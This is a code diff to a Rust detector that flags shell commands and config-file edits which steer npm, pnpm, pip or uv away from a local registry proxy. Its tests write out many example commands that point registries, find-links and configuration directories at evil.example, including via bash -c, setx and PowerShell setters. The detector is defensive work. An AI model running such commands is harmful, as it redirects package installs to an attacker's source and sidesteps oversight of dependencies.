@@ -43,6 +43,10 @@ const CONFIG_FILE_VARS: &[&str] = &[
     "yarn_rc_filename",
 ];
 
+/// Variables that move where installers look for their configuration files (the user
+/// config under `HOME`, `XDG_CONFIG_HOME` or `APPDATA`; npm's global `$PREFIX/etc/npmrc`).
+const CONFIG_DIR_VARS: &[&str] = &["home", "xdg_config_home", "appdata", "npm_config_prefix"];
+
 /// Configuration files where a registry or index URL can be set.
 const REGISTRY_FILES: &[&str] = &[
     ".npmrc",
@@ -52,6 +56,32 @@ const REGISTRY_FILES: &[&str] = &[
     ".yarnrc.yml",
     "bunfig.toml",
     "uv.toml",
+    // npm's global config (`$PREFIX/etc/npmrc`) and pnpm's settings.
+    "npmrc",
+    "pnpm-workspace.yaml",
+];
+
+/// Configuration files known by their path rather than their name (pnpm's user config).
+const REGISTRY_PATHS: &[&str] = &["pnpm/rc"];
+
+/// Words that show a configuration text sets where packages come from.
+const SOURCE_KEYS: &[&str] = &["registry", "index", "find-links", "find_links"];
+
+/// Programs that set variables from `NAME=value` arguments.
+const DECLARERS: &[&str] = &["export", "declare", "set", "typeset", "readonly", "local"];
+
+/// Shells that run a command line given after `-c` (`/c`, `-Command`): the line is checked
+/// as if it had been run directly.
+const SHELLS: &[&str] = &[
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "fish",
+    "pwsh",
+    "powershell",
+    "cmd",
 ];
 
 /// Programs that write or remove the files named in their arguments.
@@ -131,6 +161,75 @@ fn powershell_env(words: &[String]) -> Option<(&str, &str)> {
             Some((name, words.get(2).map_or("", String::as_str)))
         }
         None => None,
+    }
+}
+
+/// `[Environment]::SetEnvironmentVariable('NAME', 'VALUE', ...)` calls in the raw command
+/// text (the shell lexer splits them at the parentheses).
+fn dotnet_env_sets(command: &str) -> Vec<(String, String)> {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    let re = RE.get_or_init(|| {
+        Regex::new(concat!(
+            r#"(?i)SetEnvironmentVariable\s*\(\s*['"]?([A-Za-z_][A-Za-z0-9_]*)['"]?"#,
+            r#"\s*,\s*['"]?([^'",)]*)"#
+        ))
+        .unwrap()
+    });
+    re.captures_iter(command)
+        .map(|c| (c[1].to_string(), c[2].to_string()))
+        .collect()
+}
+
+/// Variables set by PowerShell cmdlets, `Set-Item env:NAME VALUE` (also `-Path`/`-Value`,
+/// `New-Item`, `si`, `ni`), and by Windows `setx`.
+fn other_env_sets(words: &[String]) -> Vec<(String, String)> {
+    let mut out = Vec::new();
+    let Some((p, args)) = program(words) else {
+        return out;
+    };
+    match p.to_ascii_lowercase().as_str() {
+        "set-item" | "new-item" | "si" | "ni" => {
+            let env_at = args
+                .iter()
+                .position(|a| a.get(..4).is_some_and(|e| e.eq_ignore_ascii_case("env:")));
+            if let Some(i) = env_at {
+                let value = args
+                    .iter()
+                    .position(|a| a.eq_ignore_ascii_case("-value"))
+                    .and_then(|v| args.get(v + 1))
+                    .or_else(|| args[i + 1..].iter().find(|a| !a.starts_with('-')));
+                out.push((args[i][4..].to_string(), value.cloned().unwrap_or_default()));
+            }
+        }
+        "setx" => {
+            if let [k, v, ..] = positionals(args).as_slice() {
+                out.push((k.to_string(), v.to_string()));
+            }
+        }
+        _ => {}
+    }
+    out
+}
+
+/// The command line a shell runs with `-c` (`/c`, `-Command`), when `words` start one.
+fn shell_line(words: &[String]) -> Option<String> {
+    let (p, args) = program(words)?;
+    if !SHELLS.contains(&p.to_ascii_lowercase().as_str()) {
+        return None;
+    }
+    let i = args.iter().position(|a| {
+        let a = a.to_ascii_lowercase();
+        matches!(
+            a.as_str(),
+            "-c" | "/c" | "/k" | "-command" | "-commandwithargs"
+        )
+    })?;
+    let rest = &args[i + 1..];
+    // `cmd /c` takes the rest of the line; the others take one argument.
+    if p.eq_ignore_ascii_case("cmd") {
+        Some(rest.join(" "))
+    } else {
+        rest.first().cloned()
     }
 }
 
@@ -292,27 +391,39 @@ pub fn command_reasons(command: &str, server: &str) -> Vec<String> {
         }
     }
     if writes
-        && REGISTRY_FILES.iter().any(|f| lower.contains(f))
-        && ["registry", "index"].iter().any(|k| lower.contains(k))
+        && REGISTRY_FILES
+            .iter()
+            .chain(REGISTRY_PATHS)
+            .any(|f| lower.contains(f))
+        && SOURCE_KEYS.iter().any(|k| lower.contains(k))
         && !points_at_customs(command, server)
     {
         out.push("changes a package manager's registry or index configuration".to_string());
     }
 
+    let mut dotnet = dotnet_env_sets(command);
     for words in &cmds {
-        // Assignments passed to a command, and `export`/`declare` arguments.
+        if let Some(line) = shell_line(words) {
+            out.extend(command_reasons(&line, server));
+        }
+        // Assignments passed to a command, `export`/`declare` (and the like) arguments,
+        // and the PowerShell and Windows forms.
         let (prefix, prog) = split_program(words);
-        let assigned = prefix
+        let assigned: Vec<(String, String)> = prefix
             .into_iter()
             .chain(
-                prog.filter(|(p, _)| matches!(*p, "export" | "declare" | "set"))
+                prog.filter(|(p, _)| DECLARERS.contains(p))
                     .map(|(_, a)| a.iter().map(String::as_str))
                     .into_iter()
                     .flatten(),
             )
             .filter_map(|w| w.split_once('='))
-            .chain(powershell_env(words));
-        for (k, v) in assigned {
+            .chain(powershell_env(words))
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .chain(other_env_sets(words))
+            .chain(std::mem::take(&mut dotnet))
+            .collect();
+        for (k, v) in &assigned {
             let key = k.to_ascii_lowercase();
             if REGISTRY_VARS.contains(&key.as_str()) && !points_at_customs(v, server) {
                 out.push(format!("points {k} away from the Customs proxy"));
@@ -320,6 +431,11 @@ pub fn command_reasons(command: &str, server: &str) -> Vec<String> {
             if CONFIG_FILE_VARS.contains(&key.as_str()) {
                 out.push(format!(
                     "sets {k}, which loads a configuration file that can name another registry"
+                ));
+            }
+            if CONFIG_DIR_VARS.contains(&key.as_str()) {
+                out.push(format!(
+                    "sets {k}, which changes where installers read their configuration"
                 ));
             }
         }
@@ -457,8 +573,8 @@ pub fn edit_reason(path: &str, tool_input: &Value, server: &str) -> Option<Strin
     }
     // Judged by the text the edit leaves: replacing a public registry with Customs is
     // fine; removing the Customs line, or adding another URL next to it, is not.
-    if REGISTRY_FILES.contains(&name)
-        && ["registry", "index"].iter().any(|k| text.contains(k))
+    if (REGISTRY_FILES.contains(&name) || REGISTRY_PATHS.iter().any(|p| lower.ends_with(p)))
+        && SOURCE_KEYS.iter().any(|k| text.contains(k))
         && !points_at_customs(&new_text(tool_input), server)
     {
         return Some("changes a package manager's registry or index configuration".into());
@@ -717,5 +833,55 @@ mod tests {
         ] {
             assert!(!flagged(c), "{c}: {:?}", command_reasons(c, S));
         }
+    }
+    #[test]
+    fn shells_scopes_and_other_config_files_are_flagged() {
+        for c in [
+            // Extra sources in configuration files.
+            "echo 'find-links = https://evil.example/wheels' >> ~/.config/pip/pip.conf",
+            r#"echo 'find-links = ["https://evil.example/w"]' >> uv.toml"#,
+            // The global npmrc, pnpm's own rc file and its workspace settings.
+            "echo 'registry=https://evil.example/' > /usr/local/etc/npmrc",
+            "echo 'registry=https://evil.example/' > ~/.config/pnpm/rc",
+            "echo 'registry: https://evil.example/' >> pnpm-workspace.yaml",
+            // Variables that move where installers read their configuration.
+            "HOME=/tmp/evil npm install x",
+            "export XDG_CONFIG_HOME=/tmp/evil",
+            "export NPM_CONFIG_PREFIX=/tmp/evil",
+            r"$env:APPDATA = 'C:\tmp\evil'",
+            // Other ways to set a variable.
+            "typeset -x PIP_INDEX_URL=https://evil.example/simple",
+            "readonly npm_config_registry=https://evil.example/",
+            "local PIP_INDEX_URL=https://evil.example/simple",
+            "setx NPM_CONFIG_REGISTRY https://evil.example/",
+            "[Environment]::SetEnvironmentVariable('NPM_CONFIG_REGISTRY', 'https://evil.example/', 'User')",
+            "Set-Item -Path Env:PIP_INDEX_URL -Value https://evil.example/simple",
+            "Set-Item env:PIP_INDEX_URL https://evil.example/simple",
+            // A shell running a command line of its own.
+            "bash -c 'export PIP_INDEX_URL=https://evil.example/simple; pip install x'",
+            r#"sh -c "npm config set registry https://evil.example/""#,
+            r#"pwsh -Command "$env:NPM_CONFIG_REGISTRY='https://evil.example/'""#,
+            "cmd /c set PIP_INDEX_URL=https://evil.example/simple",
+        ] {
+            assert!(flagged(c), "{c}");
+        }
+        for c in [
+            "bash -c 'npm test'",
+            "bash -c 'export PIP_INDEX_URL=http://127.0.0.1:7878/pypi/simple'",
+            r"setx PATH C:\bin",
+            "readonly LOG_LEVEL=debug",
+            "[Environment]::SetEnvironmentVariable('NODE_ENV', 'production', 'User')",
+            "Set-Item env:NODE_ENV production",
+            "echo 'save-exact=true' >> /usr/local/etc/npmrc",
+            "sh -c 'cargo build --release'",
+        ] {
+            assert!(!flagged(c), "{c}: {:?}", command_reasons(c, S));
+        }
+        let rc = json!({"content": "registry=https://evil.example/\n"});
+        assert!(edit_reason("/home/u/.config/pnpm/rc", &rc, S).is_some());
+        assert!(edit_reason("/usr/local/etc/npmrc", &rc, S).is_some());
+        let links = json!({"content": "[global]\nfind-links = https://evil.example/w\n"});
+        assert!(edit_reason("/r/pip.conf", &links, S).is_some());
+        assert!(edit_reason("/r/src/rc", &rc, S).is_none());
     }
 }
